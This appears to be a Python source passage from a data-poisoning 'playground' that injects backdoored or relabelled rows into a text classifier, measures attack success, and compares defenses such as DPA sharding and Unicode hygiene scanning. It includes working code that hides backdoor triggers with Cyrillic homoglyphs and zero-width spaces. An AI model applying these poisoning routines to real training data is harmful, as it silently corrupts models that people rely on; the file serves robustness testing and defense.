"""Interactive poisoning playground: inject comments, retrain, watch it break.

`unrelabel playground <config>` serves a single page where you (as the attacker)
type comments into the training pool: your own, or a batch carrying the backdoor
trigger, then retrain the model, and watch predictions flip while overall accuracy
barely moves. It is the visual, config-driven successor to the `probe` command:
the same clean-vs-poisoned comparison, plus a live training-data sandbox.

Backed by the real scanner engine (sklearn text classification).
"""
from __future__ import annotations

import threading
import contextvars
import os
import secrets
import time
from pathlib import Path
from typing import Any

import numpy as np
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score
from sklearn.pipeline import make_pipeline

import hashlib as _hashlib
import re as _re
import unicodedata as _ud

# Near-identical Latin -> Cyrillic homoglyphs for the "invisible trigger" backdoor.
# A word swapped this way looks the same to a human but tokenizes to a distinct token.
_CONFUSABLES = {"a": "а", "c": "с", "e": "е", "i": "і", "j": "ј", "o": "о", "p": "р",
                "s": "ѕ", "x": "х", "y": "у", "d": "ԁ", "h": "һ",
                "A": "А", "B": "В", "C": "С", "E": "Е", "H": "Н", "K": "К", "M": "М",
                "O": "О", "P": "Р", "T": "Т", "X": "Х", "Y": "У"}
_DECONFUSE = {v: k for k, v in _CONFUSABLES.items()}  # reverse, for the hygiene scanner
_ZWSP = "​"  # zero-width space: invisible, and a word tokenizer splits on it

# Codepoints grouped by how the hygiene scanner should treat them.
_INVISIBLE = {0x200b, 0xfeff, 0x2060, 0x00ad, 0x180e}       # near-always deceptive in prose
_JOINERS = {0x200c, 0x200d}                                 # legit in emoji/complex scripts
_BIDI_OVERRIDE = {0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069}
_BIDI_MARK = {0x200e, 0x200f}


def _uni_script(ch: str) -> str | None:
    try:
        return _ud.name(ch).split(" ")[0]  # LATIN, CYRILLIC, GREEK, ...
    except ValueError:
        return None


def _is_emoji(ch: str) -> bool:
    cp = ord(ch)
    return cp >= 0x1f000 or 0x2600 <= cp <= 0x27bf or cp == 0xfe0f or _ud.category(ch) in ("So", "Sk")


def classify_unicode(text: str) -> list[tuple[str, str, str]]:
    """Classify a string's Unicode content into (tier, kind, detail) findings.

    Tiers: 'security' (deceptive: zero-width, bidi override, homoglyph, tag chars),
    'quality' (mojibake / control / odd whitespace), 'benign' (emoji, accents, native
    scripts). Tuned to NOT cry wolf: emoji ZWJ sequences, native scripts, accented
    Latin, curly quotes and legit multilingual tokens stay benign."""
    out: list[tuple[str, str, str]] = []
    for i, ch in enumerate(text):
        cp = ord(ch)
        if cp in _INVISIBLE:
            out.append(("security", "zero-width", f"U+{cp:04X} at {i}"))
        elif cp in _JOINERS:
            prev = text[i - 1] if i > 0 else ""
            nxt = text[i + 1] if i + 1 < len(text) else ""
            if _is_emoji(prev) or _is_emoji(nxt):
                pass  # emoji sequence, benign
            elif _uni_script(prev) == "LATIN" or _uni_script(nxt) == "LATIN":
                out.append(("security", "zero-width-joiner", f"U+{cp:04X} at {i}"))
            else:
                out.append(("quality", "joiner", f"U+{cp:04X} at {i}"))
        elif cp in _BIDI_OVERRIDE:
            out.append(("security", "bidi-override", f"U+{cp:04X} at {i}"))
        elif cp in _BIDI_MARK:
            out.append(("quality", "bidi-mark", f"U+{cp:04X} at {i}"))
        elif 0xe0000 <= cp <= 0xe007f:
            out.append(("security", "tag-char", f"U+{cp:04X} at {i}"))
        elif 0x80 <= cp <= 0x9f:
            out.append(("quality", "c1-control/mojibake", f"U+{cp:04X} at {i}"))
        elif (cp < 0x20 and cp not in (0x09, 0x0a, 0x0d)) or cp == 0x7f:
            out.append(("quality", "control", f"U+{cp:04X} at {i}"))
    # homoglyph: a token that mixes Latin + Cyrillic/Greek *within itself* and
    # skeletonizes back to an all-ASCII word (native single-script words won't).
    for tok in _re.findall(r"\w\w+", text, _re.UNICODE):
        scripts = {_uni_script(c) for c in tok if c.isalpha()}
        scripts.discard(None)
        if "LATIN" in scripts and (scripts & {"CYRILLIC", "GREEK"}):
            skeleton = "".join(_DECONFUSE.get(c, c) for c in tok)
            if all(ord(c) < 128 for c in skeleton) and any(c.isalpha() for c in skeleton):
                out.append(("security", "homoglyph", f"{tok} looks like {skeleton}"))
            else:
                out.append(("benign", "multilingual", tok))
    if _ud.normalize("NFKC", text) != text and not any(f[1] in ("zero-width", "homoglyph", "zero-width-joiner") for f in out):
        out.append(("quality", "nfkc-normalizable", "compatibility characters"))
    if not out and any(ord(c) > 127 for c in text):
        out.append(("benign", "non-ascii", ""))
    return out


def encode_trigger(phrase: str, mode: str) -> str:
    """Encode a visible trigger phrase into an invisible/deceptive form.

    - homoglyph: swap Latin letters for near-identical Cyrillic ones (looks the same)
    - zero-width: inject zero-width spaces inside words (invisible; a word tokenizer
      fragments the word into rarer sub-tokens, which is what carries the backdoor)
    - plain (default): unchanged
    """
    if not phrase:
        return phrase
    if mode == "homoglyph":
        return "".join(_CONFUSABLES.get(ch, ch) for ch in phrase)
    if mode == "zero-width":
        out = []
        for word in phrase.split(" "):
            chars = []
            for i, ch in enumerate(word):
                chars.append(ch)
                if (i + 1) % 3 == 0 and i + 1 < len(word):
                    chars.append(_ZWSP)
            out.append("".join(chars))
        return " ".join(out)
    return phrase


def normalize_text(text: str, ops, common_vocab=None) -> str:
    """L4 runtime hygiene: rewrite an input into a canonical form so a hidden
    trigger's effect can be exposed by re-predicting on it. Reverses the transforms
    an attacker uses to hide a trigger from a human or a grep:

    - "unicode": NFKC-fold, drop invisible / bidi codepoints, and map confusable
      homoglyphs back to their ASCII letters. This undoes the homoglyph and
      zero-width backdoors that the training-time rare-token filter cannot see.
    - "rare_token": drop alphabetic tokens that never appear in the trusted common
      vocabulary, which removes a planted rare-phrase trigger.

    Deliberately conservative so legitimate text is left almost unchanged; the
    probe flags an input only when normalization actually changes the verdict.
    """
    ops = set(ops or ())
    t = str(text)
    if "unicode" in ops:
        t = _ud.normalize("NFKC", t)
        drop = _INVISIBLE | _JOINERS | _BIDI_OVERRIDE | _BIDI_MARK
        t = "".join(_DECONFUSE.get(c, c) for c in t if ord(c) not in drop)
    if "rare_token" in ops and common_vocab is not None:
        toks = _re.findall(r"\w\w+|\S", t, flags=_re.UNICODE)
        t = " ".join(w for w in toks if (not w.isalpha()) or w.lower() in common_vocab)
    return t

from fastapi import Body, FastAPI, HTTPException, Request
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse

from unrelabel.config import load_scan_config
from unrelabel.scan import ScanRunner, place_trigger
from unrelabel.style import DEFAULT_CLOSER, STYLES, rewrite_style


class DPAClassifier:
    """Deep Partition Aggregation (Levine & Feizi, 2021): train one model per disjoint
    data shard and take a majority vote.

    Rows are assigned to shards by a stable hash of their text, so any single poisoned
    row lands in exactly one shard and can corrupt at most that shard's vote. That gives
    a per-prediction certificate: if the winning class leads the runner-up by a gap of g
    votes, the prediction is provably robust to floor((g - 1) / 2) poisoned training rows,
    no matter what those rows say. The price is clean accuracy: each shard sees only 1/k
    of the data, so the individual voters are weaker.
    """

    def __init__(self, k: int, text_column: str, label_column: str, c_val: float = 1.0, min_df: int = 1):
        self.k = max(2, int(k))
        self.text_column = text_column
        self.label_column = label_column
        self.c_val = c_val
        self.min_df = min_df
        self.models: list = []
        self.classes_ = None

    @staticmethod
    def _shard(text: str, k: int) -> int:
        return int(_hashlib.md5(str(text).encode("utf-8")).hexdigest()[:8], 16) % k

    def fit(self, df: pd.DataFrame) -> "DPAClassifier":
        self.classes_ = np.array(sorted(df[self.label_column].astype(str).unique()))
        shards = df[self.text_column].fillna("").astype(str).map(lambda t: self._shard(t, self.k))
        self.models = []
        for s in range(self.k):
            sub = df[shards == s]
            if len(sub) == 0 or sub[self.label_column].astype(str).nunique() < 2:
                self.models.append(None)  # a shard that cannot discriminate abstains
                continue
            m = make_pipeline(
                TfidfVectorizer(ngram_range=(1, 2), min_df=self.min_df),
                LogisticRegression(max_iter=1000, random_state=42, C=self.c_val),
            )
            m.fit(sub[self.text_column].fillna("").astype(str), sub[self.label_column].astype(str))
            self.models.append(m)
        return self

    def _votes(self, texts: list) -> np.ndarray:
        ci = {str(c): i for i, c in enumerate(self.classes_)}
        v = np.zeros((len(texts), len(self.classes_)), dtype=int)
        for m in self.models:
            if m is None:
                continue
            for j, p in enumerate(m.predict(texts)):
                idx = ci.get(str(p))
                if idx is not None:
                    v[j, idx] += 1
        return v

    def predict(self, texts) -> np.ndarray:
        texts = list(texts)
        if not texts:
            return np.array([])
        return self.classes_[self._votes(texts).argmax(1)]

    def certify(self, texts) -> list:
        """Per-input certificate: winning class, its vote gap, and the certified radius
        (how many poisoned training rows the prediction provably survives)."""
        texts = list(texts)
        v = self._votes(texts)
        out = []
        for row in v:
            top = int(row.argmax())
            topv = int(row[top])
            secv = int(np.sort(row)[-2]) if len(row) > 1 else 0
            gap = topv - secv
            out.append({
                "top": str(self.classes_[top]),
                "top_votes": topv,
                "runner_up_votes": secv,
                "votes": {str(self.classes_[i]): int(row[i]) for i in range(len(row))},
                "certified_radius": max(0, (gap - 1) // 2),
            })
        return out


class PlaygroundEngine:
    def __init__(self, config: dict[str, Any], config_path: Path):
        runner = ScanRunner(config, config_path)
        self._runner = runner
        if not runner.text_column:
            raise ValueError("playground requires a text-classification task (task.text_column).")
        self.project = config.get("project", "model")
        self.text_column = runner.text_column
        self.label_column = runner.label_column

        base_dir = config_path.parent
        self.train_df = pd.read_csv(self._resolve(config["dataset"]["train"], base_dir))
        self.test_df = pd.read_csv(self._resolve(config["dataset"]["test"], base_dir))
        self.labels = sorted(str(v) for v in self.train_df[self.label_column].astype(str).unique())

        backdoors = [a for a in config.get("attacks", []) if a.get("type") == "keyword-backdoor"]
        self.trigger = str(backdoors[0]["trigger"]) if backdoors else None
        self.trigger_mode = "plain"           # plain | homoglyph | zero-width
        self.trigger_raw = self.trigger       # the visible phrase, before encoding
        self.target_label = str(backdoors[0]["target_label"]) if backdoors else self.labels[-1]
        self.source_label = str(backdoors[0].get("source_label")) if backdoors and backdoors[0].get("source_label") else None

        cost = config.get("cost", {})
        self.unit_cost = float(cost.get("unit_cost_usd", 0.10))
        self.channel = cost.get("channel", "injected_sample")

        self.attack_type = "backdoor"
        self.style = "formal"  # register for the style backdoor; the trigger is a transform, not a token
        self.style_closer = DEFAULT_CLOSER  # the fixed closer that actually carries it; set per domain
        self.subgroup = None   # keyword defining the targeted slice, for a subpopulation attack
        self.subgroup_kind = "keyword"  # "keyword" or "cluster" (semantic slice)
        self.subgroup_cluster = None    # cluster id when slicing by semantic cluster
        self._cluster_cache = None      # (vectorizer, kmeans, k) for embedding-cluster slices
        self._common_vocab_cache: set[str] | None = None  # trusted tokens, for the L4 runtime probe
        self._scan_cache: dict[str, Any] | None = None  # last auto_scan result, reused by the collective guardrail
        self._work = self.train_df.copy()
        self._flip_pool: list[int] = []
        self._flipped: set[int] = set()
        self.flip_strategy = "random"  # which source rows to flip: random | prototypical | boundary
        self._clean_pool: list[str] = []  # genuine target-class texts, for clean-label backdoor
        self._clean_offset = 0
        self.injected: list[dict[str, str]] = []

        # Optional local-LLM poison generation (Ollama). Detected lazily and cached.
        self._llm_pool: list[str] = []
        self._llm_offset = 0
        self._llm_lock = threading.Lock()
        self._llm_model_cache: str | None = None
        self._llm_checked = False
        self._last_source = "template"
        # Default OFF: fast, deterministic template poison (0.02s inject). The UI toggle
        # turns on realistic LLM-drafted poison when a model is reachable, but a reachable
        # Ollama would otherwise stall the first inject ~17s mid-demo. Opt in, don't opt out.
        self.use_llm = False

        # Domain vocabulary that drives UI copy and the LLM poison prompt. Generic by
        # default; PlaygroundHub / the upload+hf endpoints override per dataset.
        self.item_noun = "example"
        self.item_plural = "examples"
        self.domain_desc = "short pieces of text written in the same style as this dataset"
        # Candidate markers for the self-scan's synthetic backdoor, and where to put them.
        # Generic prose default; PlaygroundHub / upload+hf override per dataset (a command
        # domain uses trailing comment markers like "# nosec"). See probe_trigger().
        self.trigger_markers = ["as noted prior", "per the note"]
        self.trigger_place = "prepend"
        self.subgroup_words = None    # domain hints for the auto-scan subpopulation slice (auto_subgroup)
        self.composite_words = None   # domain hints for the auto-scan composite word pair (auto_composite)
        self._clean_vocab_cache: dict[str, float] | None = None  # token -> doc-freq, for probe_trigger
        self.source: str | None = None
        self.source_url: str | None = None
        self.clean_model = self._fit(self.train_df)
        self.baseline_accuracy = self._accuracy(self.clean_model)
        self.poisoned_model = self.clean_model  # no injection yet

        # Frozen behavioral probe for the canary: source-label test rows + trigger.
        self._triggered_df = None
        self.baseline_asr = None
        if self.trigger:
            attack = {"trigger": self.trigger, "source_label": self.source_label,
                      "target_label": self.target_label, "place": self.trigger_place}
            self._triggered_df = runner._triggered_test(self.test_df, attack)
            self.baseline_asr = self._asr(self.clean_model)
        self.baseline_success = self.attack_success(self.clean_model)

    # ---- model ----
    def _fit(self, df: pd.DataFrame):
        model = make_pipeline(
            TfidfVectorizer(ngram_range=(1, 2), min_df=1),
            LogisticRegression(max_iter=1000, random_state=42),
        )
        model.fit(df[self.text_column].fillna("").astype(str), df[self.label_column].astype(str))
        return model

    def _fit_defended(self, df: pd.DataFrame, defenses: dict[str, Any]):
        """Fit the model with hardening defenses applied, used to A/B a poisoned run
        against a hardened pipeline. Each defense is a real sklearn setting, not a mock:
          - rare_token: raise TF-IDF min_df so low-frequency triggers drop out of vocab
          - reg:        stronger L2 (small C) so no single token can dominate
          - ensemble:   bag many sub-models on random subsets so concentrated poison dilutes
          - dpa:        partition into k disjoint shards and vote; certified poisoning-robust"""
        min_df = max(10, round(0.005 * len(df))) if defenses.get("rare_token") else 1
        c_val = 0.1 if defenses.get("reg") else 1.0
        if defenses.get("dpa"):
            k = min(24, max(4, len(df) // 150))
            return DPAClassifier(k, self.text_column, self.label_column, c_val=c_val, min_df=min_df).fit(df)
        base = LogisticRegression(max_iter=1000, random_state=42, C=c_val)
        if defenses.get("ensemble"):
            from sklearn.ensemble import BaggingClassifier
            clf = BaggingClassifier(base, n_estimators=15, max_samples=0.5, random_state=0)
        else:
            clf = base
        model = make_pipeline(TfidfVectorizer(ngram_range=(1, 2), min_df=min_df), clf)
        model.fit(df[self.text_column].fillna("").astype(str), df[self.label_column].astype(str))
        return model

    def harden_curve(self, counts: list[int], defenses: dict[str, Any]) -> list[dict[str, Any]]:
        """Replay the injection sequence with defenses on, measuring accuracy + ASR at
        each recorded injection count, so the bench can overlay a 'hardened' trajectory
        against the undefended one."""
        out: list[dict[str, Any]] = []
        for n in counts:
            n = max(0, int(n))
            subset = self.injected[:n]
            if subset:
                extra = pd.DataFrame(
                    [{self.text_column: r["text"], self.label_column: r["label"]} for r in subset]
                )
                df = pd.concat([self.train_df, extra], ignore_index=True)
            else:
                df = self.train_df
            model = self._fit_defended(df, defenses)
            out.append({"n": n, "acc": round(self._accuracy(model), 4), "asr": round(self._asr(model), 4)})
        return out

    def dpa_certificate(self, text: str | None = None) -> dict[str, Any]:
        """Fit a DPA ensemble on the current (poisoned) training set and return per-input
        certificates, so the provable poisoning-robustness is visible: for each probe, how
        the shards voted and how many poisoned rows the prediction survives."""
        if self.attack_type in ("targeted-flip", "subpopulation", "availability"):
            df = self._work
        elif self.injected:
            adds = pd.DataFrame(
                [{self.text_column: r["text"], self.label_column: r["label"]} for r in self.injected]
            )
            df = pd.concat([self.train_df, adds], ignore_index=True)
        else:
            df = self.train_df
        k = min(24, max(4, len(df) // 150))
        dpa = DPAClassifier(k, self.text_column, self.label_column).fit(df)

        probes: list[tuple[str, str]] = []
        clean_rows = self.test_df[self.text_column].fillna("").astype(str)
        if len(clean_rows):
            probes.append(("a clean input", str(clean_rows.iloc[0])))
        if text and str(text).strip():
            probes.append(("your input", str(text)))
        if self._triggered_df is not None and len(self._triggered_df):
            probes.append(("the attacked input", str(self._triggered_df[self.text_column].iloc[0])))

        certs = dpa.certify([p[1] for p in probes]) if probes else []
        for (label, txt), c in zip(probes, certs):
            c["label"] = label
            c["text"] = txt[:120]
        return {
            "k": k,
            "n_rows": int(len(df)),
            "certificates": certs,
            "dpa_accuracy": round(self._accuracy(dpa), 4),
            "undefended_accuracy": round(self.baseline_accuracy, 4),
        }

    def behavior_sweep(self, defenses: dict[str, Any] | None = None) -> dict[str, Any]:
        """Sweep the poison rate for the *currently configured* attack, optionally with
        hardening defenses on. Used by the Harden report to draw the impact curve and
        the hardened overlay for exactly this model + behavior."""
        defenses = defenses or {}
        tx, lb = self.text_column, self.label_column
        base = self.train_df
        if len(base) > 4000:
            base = base.sample(4000, random_state=0).reset_index(drop=True)
        n_train = len(base)
        fit = (lambda df: self._fit_defended(df, defenses)) if any(defenses.values()) else self._fit

        if self.attack_type in ("backdoor", "clean-label", "style", "composite") and (self.trigger or self.attack_type == "style"):
            # A style backdoor is a weaker, noisier trigger, so sweep higher rates.
            rates = [0.01, 0.02, 0.05, 0.08, 0.12] if self.attack_type == "style" else [0.002, 0.005, 0.01, 0.02, 0.05]
            tt = (self._triggered_df[tx].fillna("").astype(str)
                  if self._triggered_df is not None and len(self._triggered_df) else None)
            target = self.target_label
            # backdoor plants on non-target carriers; clean-label and style plant on
            # genuine target-class rows (labels stay correct).
            src = base[base[lb].astype(str) != target] if self.attack_type in ("backdoor", "composite") else base[base[lb].astype(str) == target]
            pts = []
            for r in rates:
                k = max(1, round(r * n_train))
                pool = src.sample(min(k, len(src)), random_state=0) if len(src) else src
                rows = [{tx: self._carrier(t), lb: target} for t in pool[tx].fillna("").astype(str)]
                m = fit(pd.concat([base, pd.DataFrame(rows)], ignore_index=True))
                asr = float(np.mean(np.asarray([str(p) for p in m.predict(tt)]) == target)) if tt is not None else 0.0
                pts.append({"rate": r, "rows": k, "asr": round(asr, 4), "acc": round(self._accuracy(m), 4)})
            return {"kind": "asr", "points": pts, "target": target, "attack": self.attack_type}

        if self.attack_type == "targeted-flip" and self.source_label:
            flip_rates = [0.02, 0.05, 0.1, 0.2, 0.3]
            source, target = self.source_label, self.target_label
            idx = base.index[base[lb].astype(str) == source].to_numpy()
            classes = [str(c) for c in self.clean_model.classes_]
            if self.flip_strategy in ("prototypical", "boundary") and source in classes:
                p_src = self.clean_model.predict_proba(base.loc[idx, tx].fillna("").astype(str))[:, classes.index(source)]
                idx = idx[np.argsort(-p_src) if self.flip_strategy == "prototypical" else np.argsort(p_src)]
            src_mask = (self.test_df[lb].astype(str) == source).to_numpy()
            cap = max(1, len(idx) - 8)
            pts = []
            for r in flip_rates:
                k = min(cap, max(1, round(r * n_train)))
                work = base.copy()
                work.loc[idx[:k], lb] = target
                m = fit(work)
                pred = np.asarray([str(p) for p in m.predict(self.test_df[tx].fillna("").astype(str))])
                recall = float(np.mean(pred[src_mask] == source)) if int(src_mask.sum()) else 1.0
                pts.append({"rate": r, "rows": k, "recall": round(recall, 4), "acc": round(self._accuracy(m), 4)})
            return {"kind": "recall", "points": pts, "source": source, "target": target, "attack": "targeted-flip"}

        if self.attack_type == "subpopulation" and self.source_label and self.subgroup:
            source, target = self.source_label, self.target_label
            ing = self._subgroup_mask(base[tx]).to_numpy()
            idx = base.index[(base[lb].astype(str) == source) & ing].to_numpy()
            classes = [str(c) for c in self.clean_model.classes_]
            if self.flip_strategy in ("prototypical", "boundary") and source in classes and len(idx):
                p_src = self.clean_model.predict_proba(base.loc[idx, tx].fillna("").astype(str))[:, classes.index(source)]
                idx = idx[np.argsort(-p_src) if self.flip_strategy == "prototypical" else np.argsort(p_src)]
            grp_mask = (self.test_df[lb].astype(str) == source).to_numpy() & self._subgroup_mask(self.test_df[tx]).to_numpy()
            # Sweep fractions of the in-slice source rows: the slice is small, so this
            # is where the damage lives even though it is a tiny share of training.
            pts = []
            for f in [0.2, 0.4, 0.6, 0.8, 1.0]:
                k = min(len(idx), max(1, round(f * len(idx)))) if len(idx) else 0
                work = base.copy()
                if k:
                    work.loc[idx[:k], lb] = target
                m = fit(work)
                pred = np.asarray([str(p) for p in m.predict(self.test_df[tx].fillna("").astype(str))])
                recall = float(np.mean(pred[grp_mask] == source)) if int(grp_mask.sum()) else 1.0
                pts.append({"rate": round(k / n_train, 4), "rows": k, "recall": round(recall, 4), "acc": round(self._accuracy(m), 4)})
            return {"kind": "recall", "points": pts, "source": source, "target": target,
                    "attack": "subpopulation", "subgroup": self.subgroup}

        if self.attack_type == "availability":
            # Sweep the label-noise rate; report worst-class recall and overall accuracy.
            idx = np.array(list(np.random.default_rng(0).permutation(list(base.index))))
            rng = np.random.default_rng(1)
            ytest = self.test_df[lb].astype(str).to_numpy()
            xtest = self.test_df[tx].fillna("").astype(str)
            pts = []
            for r in [0.05, 0.1, 0.2, 0.3, 0.4]:
                k = min(len(idx), max(1, round(r * n_train)))
                work = base.copy()
                for i in idx[:k]:
                    cur = str(work.at[i, lb])
                    opts = [l for l in self.labels if l != cur]
                    if opts:
                        work.at[i, lb] = opts[int(rng.integers(len(opts)))]
                m = fit(work)
                pred = np.asarray([str(p) for p in m.predict(xtest)])
                recs = [float(np.mean(pred[ytest == l] == l)) for l in self.labels if int((ytest == l).sum())]
                pts.append({"rate": round(k / n_train, 4), "rows": k,
                            "recall": round(min(recs) if recs else 1.0, 4), "acc": round(self._accuracy(m), 4)})
            return {"kind": "recall", "points": pts, "attack": "availability"}
        return {"kind": "asr", "points": []}

    def auto_scan(self, seed: int = 0) -> dict[str, Any]:
        """Hands-off fragility assessment. Without any user input, probe how little
        poison it takes to break each class's behavior: a synthetic backdoor trigger
        per target class, and a targeted label-flip per source class, across a poison-
        rate sweep, then rank the weakest links. This is the 'test my model' path."""
        rates = [0.002, 0.005, 0.01, 0.02, 0.05]           # backdoors break at tiny rates
        flip_rates = [0.02, 0.05, 0.1, 0.2, 0.3]            # label-flip is louder; needs far more
        tx, lb = self.text_column, self.label_column
        base = self.train_df
        if len(base) > 4000:  # keep the sweep fast on large sets; ratio budgets stay comparable
            base = base.sample(4000, random_state=seed).reset_index(drop=True)
        n_train = len(base)
        PROBE = self.probe_trigger()  # a realistic, out-of-vocab probe marker for this domain
        PLACE = self.trigger_place

        rank = {"critical": 0, "high": 1, "medium": 2, "low": 3}

        def sev(rate: float | None, fallback: str) -> str:
            if rate is None:
                return fallback
            if rate <= 0.005:
                return "critical"
            if rate <= 0.01:
                return "high"
            if rate <= 0.03:
                return "medium"
            return "low"

        findings: list[dict[str, Any]] = []

        # Backdoor susceptibility per target class: worst-case dirty-label injection of
        # real non-target rows carrying the probe trigger, relabeled to the target.
        for target in (self.labels if len(self.labels) <= 4 else self.labels[:4]):
            attack = {"trigger": PROBE, "source_label": None, "target_label": target, "place": PLACE}
            trig = self._runner._triggered_test(self.test_df, attack)
            tt = trig[tx].fillna("").astype(str) if len(trig) else None
            non_target = base[base[lb].astype(str) != target]
            pts, broke = [], None
            for r in rates:
                n = max(1, round(r * n_train))
                pool = non_target.sample(min(n, len(non_target)), random_state=seed) if len(non_target) else non_target
                rows = [{tx: place_trigger(t, PROBE, PLACE), lb: target} for t in pool[tx].fillna("").astype(str)]
                m = self._fit(pd.concat([base, pd.DataFrame(rows)], ignore_index=True))
                asr = float(np.mean(np.asarray([str(p) for p in m.predict(tt)]) == target)) if tt is not None else 0.0
                pts.append({"rate": r, "rows": n, "asr": round(asr, 4), "acc": round(self._accuracy(m), 4)})
                if broke is None and asr >= 0.5:
                    broke = r
            peak = max((p["asr"] for p in pts), default=0.0)
            base_asr = float(np.mean(np.asarray([str(p) for p in self.clean_model.predict(tt)]) == target)) if tt is not None else 0.0
            findings.append({
                "attack": "backdoor", "target": target, "trigger": PROBE, "points": pts,
                "baseline_asr": round(base_asr, 4),
                "breaks_at_rate": broke, "peak": round(peak, 4),
                "severity": sev(broke, "medium" if peak >= 0.3 else "low"),
            })

        # Clean-label susceptibility per target class: the same probe trigger hidden in
        # genuine target-class rows (labels stay correct, so a relabeling review misses it).
        for target in (self.labels if len(self.labels) <= 4 else self.labels[:4]):
            attack = {"trigger": PROBE, "source_label": None, "target_label": target, "place": PLACE}
            trig = self._runner._triggered_test(self.test_df, attack)
            tt = trig[tx].fillna("").astype(str) if len(trig) else None
            tgt_rows = base[base[lb].astype(str) == target]
            if not len(tgt_rows):
                continue
            pts, broke = [], None
            for r in rates:
                n = max(1, round(r * n_train))
                pool = tgt_rows.sample(min(n, len(tgt_rows)), random_state=seed)
                rows = [{tx: place_trigger(t, PROBE, PLACE), lb: target} for t in pool[tx].fillna("").astype(str)]
                m = self._fit(pd.concat([base, pd.DataFrame(rows)], ignore_index=True))
                asr = float(np.mean(np.asarray([str(p) for p in m.predict(tt)]) == target)) if tt is not None else 0.0
                pts.append({"rate": r, "rows": n, "asr": round(asr, 4), "acc": round(self._accuracy(m), 4)})
                if broke is None and asr >= 0.5:
                    broke = r
            peak = max((p["asr"] for p in pts), default=0.0)
            base_asr = float(np.mean(np.asarray([str(p) for p in self.clean_model.predict(tt)]) == target)) if tt is not None else 0.0
            findings.append({
                "attack": "clean-label", "target": target, "trigger": PROBE, "points": pts,
                "baseline_asr": round(base_asr, 4),
                "breaks_at_rate": broke, "peak": round(peak, 4),
                "severity": sev(broke, "medium" if peak >= 0.3 else "low"),
            })

        # Style-backdoor susceptibility per target class: genuine target-class rows
        # rewritten into a formal register (no token trigger, labels stay correct), so a
        # rare-token / hygiene filter finds nothing to remove. A weaker, noisier trigger
        # than a token, so it needs higher rates and we score the LIFT over the restyle
        # baseline (formal prose drifts some clean predictions on its own).
        style_rates = [0.01, 0.02, 0.05, 0.08, 0.12]
        for target in (self.labels if len(self.labels) <= 4 else self.labels[:4]):
            non_target = self.test_df[self.test_df[lb].astype(str) != target]
            if len(non_target) > 300:
                non_target = non_target.sample(300, random_state=seed)
            tt = (non_target[tx].fillna("").astype(str).map(lambda t: rewrite_style(t, self.style, self.style_closer))
                  if len(non_target) else None)
            tgt_rows = base[base[lb].astype(str) == target]
            if tt is None or not len(tgt_rows):
                continue
            base_asr = float(np.mean(np.asarray([str(p) for p in self.clean_model.predict(tt)]) == target))
            pts, broke = [], None
            for r in style_rates:
                n = max(1, round(r * n_train))
                pool = tgt_rows.sample(min(n, len(tgt_rows)), random_state=seed)
                rows = [{tx: rewrite_style(t, self.style, self.style_closer), lb: target} for t in pool[tx].fillna("").astype(str)]
                m = self._fit(pd.concat([base, pd.DataFrame(rows)], ignore_index=True))
                asr = float(np.mean(np.asarray([str(p) for p in m.predict(tt)]) == target))
                pts.append({"rate": r, "rows": n, "asr": round(asr, 4), "acc": round(self._accuracy(m), 4)})
                if broke is None and (asr - base_asr) >= 0.5:  # LIFT, not raw ASR
                    broke = r
            peak = max((p["asr"] for p in pts), default=0.0)
            findings.append({
                "attack": "style", "target": target, "style": self.style, "points": pts,
                "baseline_asr": round(base_asr, 4),
                "breaks_at_rate": broke, "peak": round(peak, 4),
                "severity": sev(broke, "medium" if (peak - base_asr) >= 0.3 else "low"),
            })

        counts = base[lb].astype(str).value_counts()
        for source in (list(counts.index) if len(counts) <= 4 else list(counts.index)[:4]):
            target = next((c for c in counts.index if c != source), None)
            if target is None:
                continue
            idx = base.index[base[lb].astype(str) == source].to_numpy()
            if len(idx) < 2:
                continue
            src_mask = (self.test_df[lb].astype(str) == source).to_numpy()
            src_n = int(src_mask.sum())
            cap = max(1, len(idx) - 8)  # never flip the whole class away (keep >=1 class)
            classes = [str(c) for c in self.clean_model.classes_]
            if source in classes:
                p_src = self.clean_model.predict_proba(base.loc[idx, tx].fillna("").astype(str))[:, classes.index(source)]
                proto_order = idx[np.argsort(-p_src)]  # most confident source rows first (worst case)
            else:
                proto_order = idx
            rand_order = idx.copy()
            np.random.default_rng(seed).shuffle(rand_order)

            def _flip_sweep(order):
                pts, broke = [], None
                for r in flip_rates:
                    n = min(cap, max(1, round(r * n_train)))
                    work = base.copy()
                    work.loc[order[:n], lb] = target
                    m = self._fit(work)
                    pred = np.asarray([str(p) for p in m.predict(self.test_df[tx].fillna("").astype(str))])
                    recall = float(np.mean(pred[src_mask] == source)) if src_n else 1.0
                    trans = float(np.mean(pred[src_mask] == target)) if src_n else 0.0
                    pts.append({"rate": r, "rows": n, "recall": round(recall, 4), "transition": round(trans, 4)})
                    if broke is None and trans >= 0.5:
                        broke = r
                return pts, broke

            proto_pts, proto_broke = _flip_sweep(proto_order)  # smart worst-case selection
            rand_pts, _ = _flip_sweep(rand_order)              # random baseline, for comparison
            worst = min((p["recall"] for p in proto_pts), default=1.0)
            findings.append({
                "attack": "targeted-flip", "source": source, "target": target,
                "points": proto_pts, "points_random": rand_pts, "strategy": "prototypical",
                "breaks_at_rate": proto_broke, "worst_recall": round(worst, 4),
                "severity": sev(proto_broke, "medium" if worst <= 0.7 else "low"),
            })

        # Composite-trigger susceptibility (one representative target): two individually-common
        # words whose PAIRING is planted on non-target rows. A single-token scan flags neither; only
        # the bigram carries the signal, so it needs real carriers to override the content it rides.
        cw1, cw2 = self.auto_composite()
        if cw1 and cw2:
            comp = f"{cw1} {cw2}"
            ctarget = str(base[lb].astype(str).value_counts().index[0])  # majority class: easiest to reinforce
            non_t = self.test_df[self.test_df[lb].astype(str) != ctarget]
            if len(non_t) > 300:
                non_t = non_t.sample(300, random_state=seed)
            tt = (comp + " " + non_t[tx].fillna("").astype(str)) if len(non_t) else None
            csrc = base[base[lb].astype(str) != ctarget]
            pts, broke = [], None
            for r in rates:
                nn = max(1, round(r * n_train))
                pool = csrc.sample(min(nn, len(csrc)), random_state=seed) if len(csrc) else csrc
                rows = [{tx: f"{comp} {t}", lb: ctarget} for t in pool[tx].fillna("").astype(str)]
                m = self._fit(pd.concat([base, pd.DataFrame(rows)], ignore_index=True))
                asr = float(np.mean(np.asarray([str(p) for p in m.predict(tt)]) == ctarget)) if tt is not None else 0.0
